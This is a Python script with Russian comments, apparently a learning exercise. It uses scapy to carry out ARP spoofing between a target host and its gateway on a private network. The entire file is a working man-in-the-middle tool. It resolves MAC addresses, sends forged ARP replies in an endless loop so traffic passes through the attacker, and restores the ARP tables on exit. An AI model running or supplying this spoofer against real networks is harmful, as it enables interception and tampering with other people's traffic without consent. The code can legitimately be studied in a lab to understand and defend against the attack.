import scapy.all as scapy
import time

# фун поиска  ip
def get_mac(ip):
    # созда переменную которая будет отправлять запросы и хранить в себе свои ip
    arg_request = scapy.ARP(pdst=ip)#передали запросы
    # укз шировещатильный адрес
    brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # комбинируем
    arg_requst_brodcast = brodcast/arg_request
    # выводим полученные ответы  где получаем ответы полученые и нет
    answer = scapy.srp(arg_requst_brodcast, timeout=1, verbose=False)[0]# огр времени на запрос, также убираем загаловок не нужный и укз индекс так как в ответе два значения
    # создаем перменую которая обращается по массиву к ip индекс 0 и к mac из 2 с фун hwsrc
    return answer[0][1].hwsrc#получаем mac адресс
    

# созд фун которая будет отправять arp на другие машины
def spoof(target_ip, spoof_ip):
    # # # вывод mac
    target_mac =  get_mac(target_ip)
    # # # создаем arp ответ меняя 1 на 2, далее укажем ip нужного компа и mac и говорим что мы ip роутера
    # # # packet = scapy.ARP(op=2, pdst="172.18.0.3", hwdst="02:42:ac:12:00:03", psrc="172.18.0.1")
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # # # отправляем пакет
    scapy.send(packet, verbose=False)#так мны перестаем выводить информацию
   
# создадим фун которая будет возвращать значения обратно
def restore(target_ip, spoof_ip):
    target_mac =  get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)#здесь мы добавляем мак адерс источника чтобы он знал кто отправитель
    # выводим пакет 4 раза чтобы точно
    scapy.send(packet, count=4,verbose=False)
    
# обозначим счетсчик
count = 0
# обозанчем переменные которые будут отвечать за ip 
target_ip = "172.18.0.2"
spoof_ip =  "172.18.0.1"
# сделаем перебор ошибки
try:
    # запустим цилк
    while True:
        # собщаем что мы роутер
        spoof(target_ip, spoof_ip)
        # собщаем что мы компютер
        spoof(spoof_ip, target_ip)
        # обозначем перменную которая будет прибовлять пакеты
        count += 2
        # вызываем счетсчик которые сами создали
        print("\r[+] Send packet: " + str(count) + "\n", end="")#делаем выводи динамичным \r перезаписывает ,end="" - делаем все в строку
        # spoof()
        time.sleep(2)
# если ошибка под названием таким то выведим наш код
except KeyboardInterrupt:
    print("You exit and restore ARP")
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip )

